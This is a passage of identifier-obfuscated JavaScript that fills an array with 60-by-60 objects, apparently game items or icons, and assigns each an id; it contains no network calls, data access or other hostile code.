			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠᐃⲆⵠΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⵠⵠΔᐃⵠⵠ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠᐃⲆⵠΔ].id = ᐃᐃⲆ.ⵠᐃⲆⵠΔ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔΔⵠᐃᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⵠⲆⵠᐃᐃΔ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔΔⵠᐃᐃ].id = ᐃᐃⲆ.ΔΔⵠᐃᐃ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃΔⵠᐃⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⲆⵠⵠᐃᐃⲆ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃΔⵠᐃⵠ].id = ᐃᐃⲆ.ᐃΔⵠᐃⵠ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔᐃⲆΔⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔᐃΔΔⲆᐃⲆ], ⲆⲆΔⲆ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔᐃⲆΔⲆ].id = ᐃᐃⲆ.ΔᐃⲆΔⲆ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆᐃⲆⲆⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⲆΔᐃΔⵠΔ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆᐃⲆⲆⲆ].id = ᐃᐃⲆ.ⲆᐃⲆⲆⲆ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⵠⵠⵠⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠᐃⵠᐃΔⲆⲆ], ᐃⵠⲆΔᐃ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⵠⵠⵠⲆ].id = ᐃᐃⲆ.ⲆⵠⵠⵠⲆ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔΔⵠⵠᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠᐃᐃᐃⲆᐃⵠ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔΔⵠⵠᐃ].id = ᐃᐃⲆ.ΔΔⵠⵠᐃ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔⵠΔⲆⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.Δᐃⵠᐃᐃⵠⵠ], ᐃⵠⲆΔᐃ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔⵠΔⲆⲆ].id = ᐃᐃⲆ.ΔⵠΔⲆⲆ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆᐃᐃΔⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆΔΔᐃⵠᐃᐃ], ᐃⲆᐃᐃ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆᐃᐃΔⲆ].id = ᐃᐃⲆ.ⲆᐃᐃΔⲆ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆΔⲆᐃᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃΔⲆⲆΔᐃⵠ], Δⵠᐃⵠ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆΔⲆᐃᐃ].id = ᐃᐃⲆ.ⲆΔⲆᐃᐃ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠᐃᐃⵠᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃᐃⵠΔⲆᐃᐃ], ᐃᐃⲆΔⵠ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠᐃᐃⵠᐃ].id = ᐃᐃⲆ.ⵠᐃᐃⵠᐃ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠⵠⵠᐃⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⲆⲆΔⲆΔⵠ], ΔⲆᐃⲆ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠⵠⵠᐃⵠ].id = ᐃᐃⲆ.ⵠⵠⵠᐃⵠ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆΔᐃΔᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔᐃΔⲆⵠⵠᐃ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆΔᐃΔᐃ].id = ᐃᐃⲆ.ⲆΔᐃΔᐃ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆΔⲆⵠΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔΔⲆⲆⵠΔᐃ], ⵠᐃⵠⲆ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆΔⲆⵠΔ].id = ᐃᐃⲆ.ⲆΔⲆⵠΔ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⲆΔⵠⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠᐃᐃᐃᐃⵠⲆ], ⵠⵠⵠᐃ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⲆΔⵠⲆ].id = ᐃᐃⲆ.ⲆⲆΔⵠⲆ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠᐃᐃⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⵠΔⲆⵠᐃᐃ], ΔᐃⲆΔ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠᐃᐃⵠ].id = ᐃᐃⲆ.ⵠᐃᐃⵠ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔⵠᐃⲆⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⲆⵠⵠᐃⲆⵠ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔⵠᐃⲆⵠ].id = ᐃᐃⲆ.ΔⵠᐃⲆⵠ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆΔⵠΔΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃΔⵠⵠᐃᐃΔ], ⵠⵠⵠᐃ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆΔⵠΔΔ].id = ᐃᐃⲆ.ⲆΔⵠΔΔ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠᐃⵠⵠᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃΔᐃⵠⵠⲆΔ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠᐃⵠⵠᐃ].id = ᐃᐃⲆ.ⵠᐃⵠⵠᐃ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠⵠⵠᐃⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔΔΔⲆᐃᐃΔ], ᐃⵠⲆΔᐃ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠⵠⵠᐃⲆ].id = ᐃᐃⲆ.ⵠⵠⵠᐃⲆ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔⵠᐃⲆⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⲆⵠⵠᐃⲆⵠ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔⵠᐃⲆⵠ].id = ᐃᐃⲆ.ΔⵠᐃⲆⵠ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃᐃⲆⵠᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆᐃⲆⵠΔⵠⲆ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃᐃⲆⵠᐃ].id = ᐃᐃⲆ.ᐃᐃⲆⵠᐃ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⲆⵠΔⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔΔⵠᐃΔΔᐃ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⲆⵠΔⲆ].id = ᐃᐃⲆ.ⲆⲆⵠΔⲆ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔⵠΔΔⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔΔⲆⵠΔⲆΔ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔⵠΔΔⲆ].id = ᐃᐃⲆ.ΔⵠΔΔⲆ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠⵠⲆΔⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠᐃⲆΔΔⲆⲆ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠⵠⲆΔⲆ].id = ᐃᐃⲆ.ⵠⵠⲆΔⲆ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔᐃΔΔΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⲆⲆⲆᐃⵠⵠ], ΔᐃⲆΔ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔᐃΔΔΔ].id = ᐃᐃⲆ.ΔᐃΔΔΔ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⲆⵠᐃⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⲆⵠⵠᐃⲆⵠ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⲆⵠᐃⵠ].id = ᐃᐃⲆ.ⲆⲆⵠᐃⵠ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠΔⵠΔᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⲆⵠⲆⲆΔΔ], ΔⲆᐃⲆ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠΔⵠΔᐃ].id = ᐃᐃⲆ.ⵠΔⵠΔᐃ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔⵠⲆⵠΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⲆᐃΔΔⲆΔ], ᐃᐃⵠⲆᐃ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔⵠⲆⵠΔ].id = ᐃᐃⲆ.ΔⵠⲆⵠΔ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃⵠΔⲆᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠΔΔⵠΔⵠΔ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃⵠΔⲆᐃ].id = ᐃᐃⲆ.ᐃⵠΔⲆᐃ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆᐃⲆᐃⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⲆⲆΔΔΔᐃ], ΔΔⵠΔ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆᐃⲆᐃⲆ].id = ᐃᐃⲆ.ⲆᐃⲆᐃⲆ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔᐃⲆⵠΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⲆⲆΔⵠⲆⵠ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔᐃⲆⵠΔ].id = ᐃᐃⲆ.ΔᐃⲆⵠΔ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⲆΔᐃᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔΔⲆᐃⲆⵠⵠ], ⵠΔΔΔΔ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⲆΔᐃᐃ].id = ᐃᐃⲆ.ⲆⲆΔᐃᐃ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⲆⵠᐃᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⵠΔⲆΔⲆΔ], ᐃⲆΔⵠ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⲆⵠᐃᐃ].id = ᐃᐃⲆ.ⲆⲆⵠᐃᐃ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠᐃΔⲆⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆᐃⵠᐃⵠΔΔ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠᐃΔⲆⵠ].id = ᐃᐃⲆ.ⵠᐃΔⲆⵠ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔᐃΔΔᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⲆⲆⵠΔⵠΔ], ⵠΔΔΔΔ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔᐃΔΔᐃ].id = ᐃᐃⲆ.ΔᐃΔΔᐃ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠⲆⲆⲆΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⵠⲆᐃⵠⵠⵠ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠⲆⲆⲆΔ].id = ᐃᐃⲆ.ⵠⲆⲆⲆΔ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃΔⲆᐃΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⵠΔⵠᐃΔⲆ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃΔⲆᐃΔ].id = ᐃᐃⲆ.ᐃΔⲆᐃΔ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆΔᐃⲆⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⲆⵠⵠⵠⵠⲆ], ᐃⲆΔⵠ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆΔᐃⲆⵠ].id = ᐃᐃⲆ.ⲆΔᐃⲆⵠ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔᐃⵠΔⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠΔΔⵠⵠⵠⲆ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔᐃⵠΔⲆ].id = ᐃᐃⲆ.ΔᐃⵠΔⲆ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃⲆⵠⲆⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠΔⵠΔΔᐃⵠ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃⲆⵠⲆⵠ].id = ᐃᐃⲆ.ᐃⲆⵠⲆⵠ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔⵠⲆⲆⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔᐃᐃΔΔΔⵠ], ᐃᐃⵠⲆᐃ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔⵠⲆⲆⲆ].id = ᐃᐃⲆ.ΔⵠⲆⲆⲆ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆΔⲆⵠⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔΔᐃⵠΔⲆⵠ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆΔⲆⵠⵠ].id = ᐃᐃⲆ.ⲆΔⲆⵠⵠ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃⵠΔⵠΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⲆᐃⲆⲆⵠⲆ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃⵠΔⵠΔ].id = ᐃᐃⲆ.ᐃⵠΔⵠΔ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠᐃᐃΔⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃΔᐃΔⲆΔΔ], ⲆⲆΔⲆ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠᐃᐃΔⵠ].id = ᐃᐃⲆ.ⵠᐃᐃΔⵠ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆᐃⵠⵠΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔᐃΔΔΔⵠⵠ], ΔΔᐃΔ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆᐃⵠⵠΔ].id = ᐃᐃⲆ.ⲆᐃⵠⵠΔ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆΔΔⵠⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⲆᐃⲆΔᐃᐃ], ⵠᐃⵠⲆ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆΔΔⵠⵠ].id = ᐃᐃⲆ.ⲆΔΔⵠⵠ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠΔⲆΔΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔᐃⲆᐃⲆΔᐃ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠΔⲆΔΔ].id = ᐃᐃⲆ.ⵠΔⲆΔΔ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠⲆᐃⵠᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠᐃΔΔΔΔⲆ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠⲆᐃⵠᐃ].id = ᐃᐃⲆ.ⵠⲆᐃⵠᐃ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔΔⵠⵠⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃΔⵠᐃⵠⲆᐃ], ΔΔⵠΔ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔΔⵠⵠⲆ].id = ᐃᐃⲆ.ΔΔⵠⵠⲆ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔⲆᐃⵠⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆᐃⲆⲆᐃⵠᐃ], ⵠⲆΔⵠΔ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔⲆᐃⵠⲆ].id = ᐃᐃⲆ.ΔⲆᐃⵠⲆ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆᐃⵠᐃⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆΔΔΔⲆᐃᐃ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆᐃⵠᐃⲆ].id = ᐃᐃⲆ.ⲆᐃⵠᐃⲆ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⲆᐃᐃΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⲆⲆⲆᐃΔΔ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⲆᐃᐃΔ].id = ᐃᐃⲆ.ⲆⲆᐃᐃΔ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃⵠⵠΔⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⵠⵠΔᐃᐃᐃ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃⵠⵠΔⲆ].id = ᐃᐃⲆ.ᐃⵠⵠΔⲆ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⵠⵠΔᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⵠΔⲆⲆⵠΔ], ᐃᐃⲆⲆ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⵠⵠΔᐃ].id = ᐃᐃⲆ.ⲆⵠⵠΔᐃ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠΔΔⵠⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆΔᐃⲆᐃⲆⲆ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠΔΔⵠⵠ].id = ᐃᐃⲆ.ⵠΔΔⵠⵠ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⵠⲆΔᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔΔΔΔⵠΔⲆ], ⲆΔⵠⵠ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⵠⲆΔᐃ].id = ᐃᐃⲆ.ⲆⵠⲆΔᐃ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃᐃᐃⵠΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⵠⵠⲆⲆⲆⵠ], ⲆⲆΔⲆ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃᐃᐃⵠΔ].id = ᐃᐃⲆ.ᐃᐃᐃⵠΔ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃᐃΔⵠᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⲆⲆΔΔⲆΔ], ΔΔᐃΔ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃᐃΔⵠᐃ].id = ᐃᐃⲆ.ᐃᐃΔⵠᐃ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃⵠⲆⵠⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔᐃⲆΔΔΔΔ], ⵠΔΔΔΔ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃⵠⲆⵠⵠ].id = ᐃᐃⲆ.ᐃⵠⲆⵠⵠ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃⵠⵠⲆΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃΔⲆΔⵠᐃⵠ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃⵠⵠⲆΔ].id = ᐃᐃⲆ.ᐃⵠⵠⲆΔ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠΔΔᐃⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃᐃⵠⵠΔⵠⵠ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠΔΔᐃⲆ].id = ᐃᐃⲆ.ⵠΔΔᐃⲆ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⵠⲆⵠΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⵠᐃⲆⲆΔⲆ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⵠⲆⵠΔ].id = ᐃᐃⲆ.ⲆⵠⲆⵠΔ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃΔⲆⲆⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⵠᐃⲆⵠⲆΔ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃΔⲆⲆⲆ].id = ᐃᐃⲆ.ᐃΔⲆⲆⲆ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠⵠⲆⵠⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⵠᐃⲆⲆΔΔ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠⵠⲆⵠⲆ].id = ᐃᐃⲆ.ⵠⵠⲆⵠⲆ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠΔⵠΔⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⵠⵠⵠᐃⲆⵠ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠΔⵠΔⲆ].id = ᐃᐃⲆ.ⵠΔⵠΔⲆ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠᐃᐃⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⵠΔⲆⵠᐃᐃ], ⵠⵠⵠᐃ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠᐃᐃⵠ].id = ᐃᐃⲆ.ⵠᐃᐃⵠ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠⵠᐃⲆⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⲆⲆΔⲆⲆΔ], ΔΔⵠΔ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠⵠᐃⲆⲆ].id = ᐃᐃⲆ.ⵠⵠᐃⲆⲆ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆᐃⲆⲆΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆᐃⲆⲆᐃⲆΔ], ᐃᐃⲆΔⵠ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆᐃⲆⲆΔ].id = ᐃᐃⲆ.ⲆᐃⲆⲆΔ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠⲆⵠΔᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⵠⲆᐃⲆⵠΔ], ⲆᐃΔᐃ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠⲆⵠΔᐃ].id = ᐃᐃⲆ.ⵠⲆⵠΔᐃ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠⲆᐃΔⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠΔΔⵠᐃⲆᐃ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠⲆᐃΔⲆ].id = ᐃᐃⲆ.ⵠⲆᐃΔⲆ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⲆΔᐃΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠᐃⲆΔⲆᐃΔ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⲆΔᐃΔ].id = ᐃᐃⲆ.ⲆⲆΔᐃΔ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔⵠⲆΔⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔΔⲆⲆΔΔⲆ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔⵠⲆΔⲆ].id = ᐃᐃⲆ.ΔⵠⲆΔⲆ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆᐃⵠΔⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃᐃⲆⲆᐃᐃΔ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆᐃⵠΔⲆ].id = ᐃᐃⲆ.ⲆᐃⵠΔⲆ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃᐃᐃⲆⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⵠⲆᐃⵠⵠΔ], Δⵠᐃⵠ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃᐃᐃⲆⵠ].id = ᐃᐃⲆ.ᐃᐃᐃⲆⵠ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⵠⵠⲆⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠᐃΔΔᐃΔᐃ], ΔΔⵠΔ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⵠⵠⲆⵠ].id = ᐃᐃⲆ.ⲆⵠⵠⲆⵠ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔΔΔⵠΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⲆΔΔᐃΔΔ], ⵠⵠⵠⵠ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔΔΔⵠΔ].id = ᐃᐃⲆ.ΔΔΔⵠΔ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃΔᐃΔⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆᐃⲆᐃΔⵠᐃ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃΔᐃΔⵠ].id = ᐃᐃⲆ.ᐃΔᐃΔⵠ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔⲆⵠⵠᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⲆⵠⲆᐃᐃⵠ], Δⵠᐃⵠ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔⲆⵠⵠᐃ].id = ᐃᐃⲆ.ΔⲆⵠⵠᐃ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⲆⲆⲆⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⵠΔⲆⲆᐃⵠ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⲆⲆⲆⲆ].id = ᐃᐃⲆ.ⲆⲆⲆⲆⲆ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⵠΔᐃⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠΔᐃⵠᐃⲆΔ], ΔΔⵠΔ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⵠΔᐃⲆ].id = ᐃᐃⲆ.ⲆⵠΔᐃⲆ;
